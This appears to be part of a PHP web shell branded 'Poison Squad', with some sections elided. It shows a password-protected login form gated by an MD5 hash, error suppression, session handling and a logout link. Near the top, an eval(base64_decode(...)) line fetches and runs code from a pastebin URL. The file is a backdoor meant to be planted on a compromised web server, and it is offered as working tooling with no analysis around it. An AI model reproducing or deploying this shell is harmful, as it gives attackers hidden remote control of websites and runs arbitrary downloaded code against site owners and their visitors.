<?php
$auth_pass = "f354ff5a126900a7ff1e82b9c311e02d"; //pass md5
eval(base64_decode(file_get_contents('https://pastebin.com/raw/4pEJx74s')));
@session_start(); 
@error_reporting(0); 
@error_log(0);
...
<html>
<head>
<title>Poison Squad</title>
<link href='//efdreams.com/data_images/dreams/poison/poison-03.jpg' rel='icon' type='image/x-icon'/>
<meta charset="UTF-8">
<style type='text/css'>
...
<center> 
<form method=post>
<input type=password name=masuk> 
</form>
</center>
    <?php
    exit; 
...
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $auth_pass ) || 
        ( isset( $_POST['masuk'] ) && ( md5($_POST['masuk']) == $auth_pass ) ) ) 
...
echo "<li>[ <a href='?logout=true'>LogOut</a> ]<br></li>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['logout'] == true) {
